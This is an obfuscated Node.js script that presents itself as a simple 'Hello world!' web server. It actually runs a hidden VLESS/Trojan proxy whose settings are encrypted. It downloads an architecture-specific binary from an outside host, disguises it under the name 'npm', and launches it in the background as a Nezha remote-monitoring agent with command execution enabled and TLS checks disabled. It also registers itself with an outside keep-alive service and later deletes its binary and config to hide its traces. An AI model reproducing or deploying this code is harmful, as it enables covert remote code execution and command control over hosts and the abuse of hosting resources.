const _0x460cfc=_0x11aa;(function(_0x4f3a1a,_0x24fdba){const _0x5d7bd4={_0x5a26ae:0x168,_0x1331d3:0x144,_0x597788:0x13e,_0x2354bd:0x120,_0x40d757:0x173},_0xbd2244=_0x11aa,_0x5241bc=_0x4f3a1a();while(!![]){try{const _0x451115=parseInt(_0xbd2244(0x10b))/0x1*(-parseInt(_0xbd2244(0x150))/0x2)+-parseInt(_0xbd2244(_0x5d7bd4._0x5a26ae))/0x3*(parseInt(_0xbd2244(_0x5d7bd4._0x1331d3))/0x4)+parseInt(_0xbd2244(0x172))/0x5+-parseInt(_0xbd2244(0x167))/0x6*(parseInt(_0xbd2244(_0x5d7bd4._0x597788))/0x7)+parseInt(_0xbd2244(0x125))/0x8*(parseInt(_0xbd2244(0x110))/0x9)+-parseInt(_0xbd2244(_0x5d7bd4._0x2354bd))/0xa+-parseInt(_0xbd2244(0x17d))/0xb*(-parseInt(_0xbd2244(_0x5d7bd4._0x40d757))/0xc);if(_0x451115===_0x24fdba)break;else _0x5241bc['push'](_0x5241bc['shift']());}catch(_0x32aa83){_0x5241bc['push'](_0x5241bc['shift']());}}}(_0x11db,0xa18b4));const os=require('os'),http=require(_0x460cfc(0x183)),fs=require('fs'),axios=require(_0x460cfc(0x138)),net=require(_0x460cfc(0x117)),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x460cfc(0x132)),{WebSocket,createWebSocketStream}=require('ws');function _0x11db(){const _0x285cff=['\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','743615BzwAAf','60nRBocn','npm\x20download\x20successfully','trojan://','digest','bbMXwj24nhu73o4A','every','concat','pipe',':443?security=tls&sni=','includes','5328829UUgZyf','application/dns-json','catch','createServer','writeHead','text/html','http','url','substr','Unknown','send','chmod\x20+x\x20npm','NEZHA_PORT','PORT','false','https://ipapi.co/json/','final','Server','aes-256-cbc','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Server\x20is\x20running\x20on\x20port\x20','client_secret:\x20','get','from','slice','7YHFJeE','error:\x20','createDecipheriv','decode','&path=%2F','9063VBwKXN','npm','unlink','post','https://amd64.ssss.nyc.mn/agent','application/json','https://amd64.ssss.nyc.mn/v1','net','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','connection','trim','readUInt8','SUB_PATH','close','Failed\x20to\x20resolve\x20','reduce','8288070NUCyYZ','Status','utf-8','once','npm\x20is\x20already\x20running,\x20skip\x20running...','7512pCNFMa','https://','country_code','readUInt16BE','2096','https://arm64.ssss.nyc.mn/v1','Automatic\x20Access\x20Task\x20added\x20successfully','443','Answer','map','arm64','https://arm64.ssss.nyc.mn/agent','base64','child_process','true','log','1234.abc.com','then','env','axios','node','success','&type=A','write','end','7JrsGOu','sha256','message','toString','https://dns.google/resolve?name=','config.yaml','12JhnYZu','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','setsid\x20nohup\x20./npm\x20-s\x20','npm\x20is\x20running','stream','find','test','https://oooo.serv00.net/add-url','NEZHA_SERVER','join','length','org','406jkTuze','index.html','update','countryCode','WSPATH','hex','createHash','sha224','arm','8.8.4.4','1.1.1.1','Hello\x20world!','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','data','split','error','AUTO_ACCESS',':443?encryption=none&security=tls&sni=','replace','\x20-p\x20','connect','44f6837b-bd38-425d-ab58-ccead6d89299','NEZHA_KEY','6355452kFXEHE','965337nxpIVN','2053','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2083','&fp=chrome&type=ws&host=','http://ip-api.com/json/','Not\x20Found\x0a','vless://'];_0x11db=function(){return _0x285cff;};return _0x11db();}let UUID=process[_0x460cfc(0x137)]['A']||process['env']['UUID']||_0x460cfc(0x165);const NEZHA_SERVER=process['env'][_0x460cfc(0x14c)]||'',NEZHA_PORT=process['env'][_0x460cfc(0xfe)]||'',NEZHA_KEY=process[_0x460cfc(0x137)][_0x460cfc(0x166)]||'';let DOMAIN=process[_0x460cfc(0x137)]['B']||process[_0x460cfc(0x137)]['DOMAIN']||_0x460cfc(0x135);const AUTO_ACCESS=process[_0x460cfc(0x137)][_0x460cfc(0x160)]||!![],WSPATH=process[_0x460cfc(0x137)][_0x460cfc(0x154)]||UUID[_0x460cfc(0x10a)](0x0,0x8);let SUB_PATH=process[_0x460cfc(0x137)]['C']||process[_0x460cfc(0x137)][_0x460cfc(0x11c)]||'sclzhhbsub',NAME=process[_0x460cfc(0x137)]['D']||process[_0x460cfc(0x137)]['NAME']||_0x460cfc(0x139);const PORT=process[_0x460cfc(0x137)]['E']||process[_0x460cfc(0x137)][_0x460cfc(0xff)]||0x1eb4,key=crypto[_0x460cfc(0x156)](_0x460cfc(0x13f))[_0x460cfc(0x152)](_0x460cfc(0x177))[_0x460cfc(0x176)](),iv=Buffer[_0x460cfc(0x109)]('GddgwiSJj4hHsw72');function decrypt(_0x3d65fe){const _0x2341fd={_0x215884:0x102,_0x494736:0x141},_0x56c1bc=_0x460cfc;let _0x11234c=Buffer[_0x56c1bc(0x109)](_0x3d65fe,_0x56c1bc(0x131)),_0x4bf53f=crypto[_0x56c1bc(0x10d)](_0x56c1bc(0x104),key,iv),_0xaf9edb=_0x4bf53f['update'](_0x11234c);return _0xaf9edb=Buffer[_0x56c1bc(0x179)]([_0xaf9edb,_0x4bf53f[_0x56c1bc(_0x2341fd._0x215884)]()]),_0xaf9edb[_0x56c1bc(_0x2341fd._0x494736)]('utf8');}UUID=decrypt(UUID),DOMAIN=decrypt(DOMAIN),SUB_PATH=decrypt(SUB_PATH),NAME=decrypt(NAME);let ISP='';const GetISP=async()=>{const _0x303452={_0x317033:0x127,_0x1ce9bd:0x15d,_0x1543b7:0x14f,_0xfb7a75:0x108,_0x303cf9:0x16e,_0x588c77:0x14f,_0x50dddd:0xfb},_0x46772e=_0x460cfc;try{const _0x15364a=await axios['get'](_0x46772e(0x101),{'timeout':0xbb8});if(_0x15364a[_0x46772e(0x15d)]&&_0x15364a['data'][_0x46772e(_0x303452._0x317033)]&&_0x15364a['data'][_0x46772e(0x14f)]){ISP=_0x15364a[_0x46772e(_0x303452._0x1ce9bd)][_0x46772e(0x127)]+'_'+_0x15364a[_0x46772e(0x15d)][_0x46772e(_0x303452._0x1543b7)];return;}}catch(_0x2a6d56){try{const _0xdb405e=await axios[_0x46772e(_0x303452._0xfb7a75)](_0x46772e(_0x303452._0x303cf9),{'timeout':0xbb8});if(_0xdb405e[_0x46772e(_0x303452._0x1ce9bd)]&&_0xdb405e[_0x46772e(0x15d)]['status']===_0x46772e(0x13a)&&_0xdb405e['data'][_0x46772e(0x153)]&&_0xdb405e[_0x46772e(_0x303452._0x1ce9bd)][_0x46772e(_0x303452._0x588c77)]){ISP=_0xdb405e['data']['countryCode']+'_'+_0xdb405e['data'][_0x46772e(_0x303452._0x1543b7)];return;}}catch(_0x49625b){}}ISP=_0x46772e(_0x303452._0x50dddd);};GetISP();const httpServer=http[_0x460cfc(0x180)]((_0x53b407,_0x171e18)=>{const _0x5be7a3={_0x1941df:0x170,_0x5c92de:0x17b,_0x52b2bf:0x16d,_0x5e3098:0x10f,_0x4c396a:0x131,_0x1c36cd:0x181,_0x1d33b2:0x13d},_0x2518c1={_0x1ed7c1:0x181,_0x20bf8c:0x15b,_0x57d3e4:0x182},_0x936631=_0x460cfc;if(_0x53b407['url']==='/'){const _0x151df3=path[_0x936631(0x14d)](__dirname,_0x936631(0x151));fs['readFile'](_0x151df3,'utf8',(_0x5d0df0,_0x4f2166)=>{const _0x280a70=_0x936631;if(_0x5d0df0){_0x171e18[_0x280a70(_0x2518c1._0x1ed7c1)](0xc8,{'Content-Type':_0x280a70(0x182)}),_0x171e18[_0x280a70(0x13d)](_0x280a70(_0x2518c1._0x20bf8c));return;}_0x171e18[_0x280a70(_0x2518c1._0x1ed7c1)](0xc8,{'Content-Type':_0x280a70(_0x2518c1._0x57d3e4)}),_0x171e18[_0x280a70(0x13d)](_0x4f2166);});return;}else{if(_0x53b407[_0x936631(0x184)]==='/'+SUB_PATH){const _0x56a628=_0x936631(_0x5be7a3._0x1941df)+UUID+'@'+DOMAIN+_0x936631(0x161)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x936631(0x10f)+WSPATH+'#'+NAME+'-'+ISP,_0x28b0a5=_0x936631(0x175)+UUID+'@'+DOMAIN+_0x936631(_0x5be7a3._0x5c92de)+DOMAIN+_0x936631(_0x5be7a3._0x52b2bf)+DOMAIN+_0x936631(_0x5be7a3._0x5e3098)+WSPATH+'#'+NAME+'-'+ISP,_0x2f64ca=_0x56a628+'\x0a'+_0x28b0a5,_0x3eedc9=Buffer[_0x936631(0x109)](_0x2f64ca)['toString'](_0x936631(_0x5be7a3._0x4c396a));_0x171e18[_0x936631(0x181)](0xc8,{'Content-Type':'text/plain'}),_0x171e18['end'](_0x3eedc9+'\x0a');}else _0x171e18[_0x936631(_0x5be7a3._0x1c36cd)](0x194,{'Content-Type':'text/plain'}),_0x171e18[_0x936631(_0x5be7a3._0x1d33b2)](_0x936631(0x16f));}}),wss=new WebSocket[(_0x460cfc(0x103))]({'server':httpServer}),uuid=UUID[_0x460cfc(0x162)](/-/g,''),DNS_SERVERS=[_0x460cfc(0x159),_0x460cfc(0x15a)];function resolveHost(_0x4694ff){const _0x6f7b4={_0x1e0d40:0x14a},_0x4f94a2={_0xdc4d75:0x14e,_0x592dc5:0x142,_0x3ff9b3:0x13b,_0x16e007:0x17f};return new Promise((_0xbff710,_0x119dcd)=>{const _0x5a54b2=_0x11aa;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5a54b2(_0x6f7b4._0x1e0d40)](_0x4694ff)){_0xbff710(_0x4694ff);return;}let _0x238e12=0x0;function _0x3afc2c(){const _0x5afeb1={_0x1602c0:0x15d,_0x543546:0x121,_0x127d7e:0x12d,_0x1e26bc:0x149},_0xc59139=_0x5a54b2;if(_0x238e12>=DNS_SERVERS[_0xc59139(_0x4f94a2._0xdc4d75)]){_0x119dcd(new Error(_0xc59139(0x11e)+_0x4694ff+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x465255=DNS_SERVERS[_0x238e12];_0x238e12++;const _0x434f24=_0xc59139(_0x4f94a2._0x592dc5)+encodeURIComponent(_0x4694ff)+_0xc59139(_0x4f94a2._0x3ff9b3);axios[_0xc59139(0x108)](_0x434f24,{'timeout':0x1388,'headers':{'Accept':_0xc59139(0x17e)}})[_0xc59139(0x136)](_0x1fbc99=>{const _0x1efd71=_0xc59139,_0x130eac=_0x1fbc99[_0x1efd71(_0x5afeb1._0x1602c0)];if(_0x130eac[_0x1efd71(_0x5afeb1._0x543546)]===0x0&&_0x130eac[_0x1efd71(_0x5afeb1._0x127d7e)]&&_0x130eac[_0x1efd71(0x12d)]['length']>0x0){const _0x6bdcaa=_0x130eac[_0x1efd71(_0x5afeb1._0x127d7e)][_0x1efd71(_0x5afeb1._0x1e26bc)](_0x15ec05=>_0x15ec05['type']===0x1);if(_0x6bdcaa){_0xbff710(_0x6bdcaa[_0x1efd71(_0x5afeb1._0x1602c0)]);return;}}_0x3afc2c();})[_0xc59139(_0x4f94a2._0x16e007)](_0x218f59=>{_0x3afc2c();});}_0x3afc2c();});}function handleVlessConnection(_0x2c194c,_0xba7a31){const _0x28f502={_0x64708e:0x10a,_0xd7df53:0x128,_0x17fe5d:0x11b,_0x41c10b:0x10a,_0x38ad3d:0x10a,_0x274d43:0x14d,_0x50a33c:0x136},_0x3a32a6={_0x7c7526:0x164},_0x512c4c=_0x460cfc,[_0x3786bd]=_0xba7a31,_0x2ada25=_0xba7a31[_0x512c4c(0x10a)](0x1,0x11);if(!_0x2ada25['every']((_0x375496,_0x1d5993)=>_0x375496==parseInt(uuid[_0x512c4c(0xfa)](_0x1d5993*0x2,0x2),0x10)))return![];let _0x5dc3e6=_0xba7a31['slice'](0x11,0x12)[_0x512c4c(0x11b)]()+0x13;const _0x45c85d=_0xba7a31[_0x512c4c(_0x28f502._0x64708e)](_0x5dc3e6,_0x5dc3e6+=0x2)[_0x512c4c(_0x28f502._0xd7df53)](0x0),_0x4b3232=_0xba7a31['slice'](_0x5dc3e6,_0x5dc3e6+=0x1)[_0x512c4c(_0x28f502._0x17fe5d)](),_0x1b6c6b=_0x4b3232==0x1?_0xba7a31['slice'](_0x5dc3e6,_0x5dc3e6+=0x4)[_0x512c4c(0x14d)]('.'):_0x4b3232==0x2?new TextDecoder()[_0x512c4c(0x10e)](_0xba7a31[_0x512c4c(_0x28f502._0x41c10b)](_0x5dc3e6+0x1,_0x5dc3e6+=0x1+_0xba7a31[_0x512c4c(_0x28f502._0x64708e)](_0x5dc3e6,_0x5dc3e6+0x1)[_0x512c4c(0x11b)]())):_0x4b3232==0x3?_0xba7a31[_0x512c4c(_0x28f502._0x38ad3d)](_0x5dc3e6,_0x5dc3e6+=0x10)[_0x512c4c(0x11f)]((_0x1e099f,_0x2d8e8e,_0x144bfd,_0x36e936)=>_0x144bfd%0x2?_0x1e099f[_0x512c4c(0x179)](_0x36e936[_0x512c4c(0x10a)](_0x144bfd-0x1,_0x144bfd+0x1)):_0x1e099f,[])[_0x512c4c(0x12e)](_0x70b5ac=>_0x70b5ac[_0x512c4c(0x128)](0x0)[_0x512c4c(0x141)](0x10))[_0x512c4c(_0x28f502._0x274d43)](':'):'';_0x2c194c[_0x512c4c(0xfc)](new Uint8Array([_0x3786bd,0x0]));const _0x1000f6=createWebSocketStream(_0x2c194c);return resolveHost(_0x1b6c6b)[_0x512c4c(_0x28f502._0x50a33c)](_0x276f9f=>{const _0xe3ccd8={_0x1128ad:0x13c,_0x8142c:0x17a},_0x3d03af=_0x512c4c;net[_0x3d03af(0x164)]({'host':_0x276f9f,'port':_0x45c85d},function(){const _0x4ac7db=_0x3d03af;this[_0x4ac7db(_0xe3ccd8._0x1128ad)](_0xba7a31[_0x4ac7db(0x10a)](_0x5dc3e6)),_0x1000f6['on'](_0x4ac7db(0x15f),()=>{})[_0x4ac7db(_0xe3ccd8._0x8142c)](this)['on']('error',()=>{})[_0x4ac7db(_0xe3ccd8._0x8142c)](_0x1000f6);})['on']('error',()=>{});})[_0x512c4c(0x17f)](_0x4c1bb9=>{const _0x2bfb46={_0xfd1373:0x15f,_0x212a8d:0x17a},_0x3dbe03=_0x512c4c;net[_0x3dbe03(_0x3a32a6._0x7c7526)]({'host':_0x1b6c6b,'port':_0x45c85d},function(){const _0x4c1ce4=_0x3dbe03;this[_0x4c1ce4(0x13c)](_0xba7a31[_0x4c1ce4(0x10a)](_0x5dc3e6)),_0x1000f6['on'](_0x4c1ce4(_0x2bfb46._0xfd1373),()=>{})[_0x4c1ce4(_0x2bfb46._0x212a8d)](this)['on']('error',()=>{})[_0x4c1ce4(_0x2bfb46._0x212a8d)](_0x1000f6);})['on'](_0x3dbe03(0x15f),()=>{});}),!![];}function handleTrojanConnection(_0x37794a,_0x23a062){const _0x137769={_0x21156b:0x141,_0x4fa63e:0x155,_0x26ee67:0x10a,_0x14f6b3:0x14d,_0x278568:0x11f,_0x4a17d8:0x136},_0x718e7={_0x29dc72:0x15f},_0x1b1392={_0x2b304a:0x17a,_0x2d993f:0x15f},_0x443a94={_0x412b06:0x164,_0x20da0f:0x15f},_0x27560a=_0x460cfc;try{if(_0x23a062['length']<0x3a)return![];const _0x1d89c7=_0x23a062['slice'](0x0,0x38)[_0x27560a(_0x137769._0x21156b)](),_0xcaf18d=[UUID];let _0xe848d9=null;for(const _0x51259c of _0xcaf18d){const _0x546917=crypto['createHash'](_0x27560a(0x157))[_0x27560a(0x152)](_0x51259c)[_0x27560a(0x176)](_0x27560a(_0x137769._0x4fa63e));if(_0x546917===_0x1d89c7){_0xe848d9=_0x51259c;break;}}if(!_0xe848d9)return![];let _0x1d8662=0x38;_0x23a062[_0x1d8662]===0xd&&_0x23a062[_0x1d8662+0x1]===0xa&&(_0x1d8662+=0x2);const _0x517203=_0x23a062[_0x1d8662];if(_0x517203!==0x1)return![];_0x1d8662+=0x1;const _0x1ec77e=_0x23a062[_0x1d8662];_0x1d8662+=0x1;let _0x54b463,_0x7c42b7;if(_0x1ec77e===0x1)_0x54b463=_0x23a062[_0x27560a(_0x137769._0x26ee67)](_0x1d8662,_0x1d8662+0x4)[_0x27560a(_0x137769._0x14f6b3)]('.'),_0x1d8662+=0x4;else{if(_0x1ec77e===0x3){const _0x195175=_0x23a062[_0x1d8662];_0x1d8662+=0x1,_0x54b463=_0x23a062[_0x27560a(_0x137769._0x26ee67)](_0x1d8662,_0x1d8662+_0x195175)[_0x27560a(_0x137769._0x21156b)](),_0x1d8662+=_0x195175;}else{if(_0x1ec77e===0x4)_0x54b463=_0x23a062[_0x27560a(0x10a)](_0x1d8662,_0x1d8662+0x10)[_0x27560a(_0x137769._0x278568)]((_0x5913a8,_0x180139,_0x5eae29,_0x4d9053)=>_0x5eae29%0x2?_0x5913a8[_0x27560a(0x179)](_0x4d9053[_0x27560a(0x10a)](_0x5eae29-0x1,_0x5eae29+0x1)):_0x5913a8,[])['map'](_0x1b8bbd=>_0x1b8bbd['readUInt16BE'](0x0)[_0x27560a(0x141)](0x10))['join'](':'),_0x1d8662+=0x10;else return![];}}_0x7c42b7=_0x23a062['readUInt16BE'](_0x1d8662),_0x1d8662+=0x2;_0x1d8662<_0x23a062[_0x27560a(0x14e)]&&_0x23a062[_0x1d8662]===0xd&&_0x23a062[_0x1d8662+0x1]===0xa&&(_0x1d8662+=0x2);const _0x55adbd=createWebSocketStream(_0x37794a);return resolveHost(_0x54b463)[_0x27560a(_0x137769._0x4a17d8)](_0x519fda=>{const _0x130002=_0x27560a;net[_0x130002(_0x443a94._0x412b06)]({'host':_0x519fda,'port':_0x7c42b7},function(){const _0x7ad15d=_0x130002;_0x1d8662<_0x23a062['length']&&this['write'](_0x23a062[_0x7ad15d(0x10a)](_0x1d8662)),_0x55adbd['on'](_0x7ad15d(0x15f),()=>{})[_0x7ad15d(0x17a)](this)['on'](_0x7ad15d(0x15f),()=>{})[_0x7ad15d(0x17a)](_0x55adbd);})['on'](_0x130002(_0x443a94._0x20da0f),()=>{});})[_0x27560a(0x17f)](_0x405082=>{const _0x41b259=_0x27560a;net[_0x41b259(0x164)]({'host':_0x54b463,'port':_0x7c42b7},function(){const _0x5eb073=_0x41b259;_0x1d8662<_0x23a062[_0x5eb073(0x14e)]&&this['write'](_0x23a062['slice'](_0x1d8662)),_0x55adbd['on'](_0x5eb073(0x15f),()=>{})[_0x5eb073(_0x1b1392._0x2b304a)](this)['on'](_0x5eb073(_0x1b1392._0x2d993f),()=>{})[_0x5eb073(_0x1b1392._0x2b304a)](_0x55adbd);})['on'](_0x41b259(_0x718e7._0x29dc72),()=>{});}),!![];}catch(_0x30688c){return![];}}wss['on'](_0x460cfc(0x119),(_0x1561f6,_0x413639)=>{const _0x14f8fa={_0x30bf94:0x123,_0xcc21e8:0x140},_0x3da8e8=_0x460cfc,_0x26a41a=_0x413639['url']||'';_0x1561f6[_0x3da8e8(_0x14f8fa._0x30bf94)](_0x3da8e8(_0x14f8fa._0xcc21e8),_0x345f29=>{const _0x1de557=_0x3da8e8;if(_0x345f29[_0x1de557(0x14e)]>0x11&&_0x345f29[0x0]===0x0){const _0x13d460=_0x345f29[_0x1de557(0x10a)](0x1,0x11),_0x33a8ce=_0x13d460[_0x1de557(0x178)]((_0x40c5c8,_0x5aff30)=>_0x40c5c8==parseInt(uuid[_0x1de557(0xfa)](_0x5aff30*0x2,0x2),0x10));if(_0x33a8ce){!handleVlessConnection(_0x1561f6,_0x345f29)&&_0x1561f6['close']();return;}}!handleTrojanConnection(_0x1561f6,_0x345f29)&&_0x1561f6[_0x1de557(0x11d)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5e3979={_0x4f37ec:0x158,_0x4abd48:0x12a,_0x806ee2:0x130},_0x2b3d78=_0x460cfc,_0x466983=os['arch']();return _0x466983===_0x2b3d78(_0x5e3979._0x4f37ec)||_0x466983===_0x2b3d78(0x12f)||_0x466983==='aarch64'?!NEZHA_PORT?_0x2b3d78(_0x5e3979._0x4abd48):_0x2b3d78(_0x5e3979._0x806ee2):!NEZHA_PORT?_0x2b3d78(0x116):_0x2b3d78(0x114);},downloadFile=async()=>{const _0x12464c={_0x10a7ec:0x108,_0x448214:0x148,_0x52d8ed:0x17a},_0x2da5ae={_0xb5718f:0x15f},_0x55c0c6={_0x4ded83:0x174,_0x5e8836:0xfd},_0x3a65f2=_0x460cfc;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x555151=getDownloadUrl(),_0x1383d3=await axios({'method':_0x3a65f2(_0x12464c._0x10a7ec),'url':_0x555151,'responseType':_0x3a65f2(_0x12464c._0x448214)}),_0xb93f4c=fs['createWriteStream'](_0x3a65f2(0x111));return _0x1383d3['data'][_0x3a65f2(_0x12464c._0x52d8ed)](_0xb93f4c),new Promise((_0x27befc,_0x10393b)=>{const _0x4c9525=_0x3a65f2;_0xb93f4c['on']('finish',()=>{const _0x299b46=_0x11aa;console['log'](_0x299b46(_0x55c0c6._0x4ded83)),exec(_0x299b46(_0x55c0c6._0x5e8836),_0x3e800e=>{if(_0x3e800e)_0x10393b(_0x3e800e);_0x27befc();});}),_0xb93f4c['on'](_0x4c9525(_0x2da5ae._0xb5718f),_0x10393b);});}catch(_0x4839c0){throw _0x4839c0;}},runnz=async()=>{const _0x4010b6={_0x372eb8:0x16a,_0x74ab84:0x134,_0xcb8c0b:0x12c,_0x3f3ecc:0x146,_0x3de213:0x15e,_0x39e40c:0x17c,_0x137e55:0x100,_0x59d9e6:0x118,_0x5600e1:0x143,_0x2a5b6b:0x134,_0x50d636:0x145,_0x520577:0x15f},_0xb87ffc={_0x59068e:0x134},_0x1abb4c=_0x460cfc;try{const _0x3277d1=execSync(_0x1abb4c(_0x4010b6._0x372eb8),{'encoding':_0x1abb4c(0x122)});if(_0x3277d1[_0x1abb4c(0x11a)]()!==''){console[_0x1abb4c(_0x4010b6._0x74ab84)](_0x1abb4c(0x124));return;}}catch(_0x1a7837){}await downloadFile();let _0x1134dd='',_0xf0ba2b=[_0x1abb4c(_0x4010b6._0xcb8c0b),'8443',_0x1abb4c(0x129),'2087',_0x1abb4c(0x16c),_0x1abb4c(0x169)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3ccf15=_0xf0ba2b[_0x1abb4c(0x17c)](NEZHA_PORT)?'--tls':'';_0x1134dd=_0x1abb4c(_0x4010b6._0x3f3ecc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1abb4c(0x163)+NEZHA_KEY+'\x20'+_0x3ccf15+_0x1abb4c(0x16b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x39d68f=NEZHA_SERVER[_0x1abb4c(0x17c)](':')?NEZHA_SERVER[_0x1abb4c(_0x4010b6._0x3de213)](':')['pop']():'',_0x19048d=_0xf0ba2b[_0x1abb4c(_0x4010b6._0x39e40c)](_0x39d68f)?_0x1abb4c(0x133):_0x1abb4c(_0x4010b6._0x137e55),_0x4f3e96=_0x1abb4c(0x107)+NEZHA_KEY+_0x1abb4c(0x171)+NEZHA_SERVER+_0x1abb4c(_0x4010b6._0x59d9e6)+_0x19048d+_0x1abb4c(0x105)+UUID;fs['writeFileSync'](_0x1abb4c(_0x4010b6._0x5600e1),_0x4f3e96);}_0x1134dd=_0x1abb4c(0x15c);}else{console[_0x1abb4c(_0x4010b6._0x2a5b6b)](_0x1abb4c(_0x4010b6._0x50d636));return;}}try{exec(_0x1134dd,{'shell':'/bin/bash'},_0x506a87=>{const _0x1e260c=_0x1abb4c;if(_0x506a87)console['error']('npm\x20running\x20error:',_0x506a87);else console[_0x1e260c(_0xb87ffc._0x59068e)](_0x1e260c(0x147));});}catch(_0x157825){console[_0x1abb4c(_0x4010b6._0x520577)](_0x1abb4c(0x10c)+_0x157825);}};async function addAccessTask(){const _0x3207d3={_0x20f9f6:0x113,_0x49c444:0x115},_0x2eac0a=_0x460cfc;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x9e5959=_0x2eac0a(0x126)+DOMAIN+'/'+SUB_PATH;try{const _0x2f6e38=await axios[_0x2eac0a(_0x3207d3._0x20f9f6)](_0x2eac0a(0x14b),{'url':_0x9e5959},{'headers':{'Content-Type':_0x2eac0a(_0x3207d3._0x49c444)}});console[_0x2eac0a(0x134)](_0x2eac0a(0x12b));}catch(_0xb23ab3){}}function _0x11aa(_0x361ed3,_0x57a0d3){const _0x11db04=_0x11db();return _0x11aa=function(_0x11aac4,_0x5af5c6){_0x11aac4=_0x11aac4-0xfa;let _0x400229=_0x11db04[_0x11aac4];return _0x400229;},_0x11aa(_0x361ed3,_0x57a0d3);}const delFiles=()=>{const _0x262fb6={_0x2199e0:0x112,_0x42e3c6:0x143},_0x4a7651=_0x460cfc;fs[_0x4a7651(_0x262fb6._0x2199e0)](_0x4a7651(0x111),()=>{}),fs['unlink'](_0x4a7651(_0x262fb6._0x42e3c6),()=>{});};httpServer['listen'](PORT,()=>{const _0x5a0e35={_0x630356:0x106},_0x35f85d=_0x460cfc;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x35f85d(0x134)](_0x35f85d(_0x5a0e35._0x630356)+PORT);});
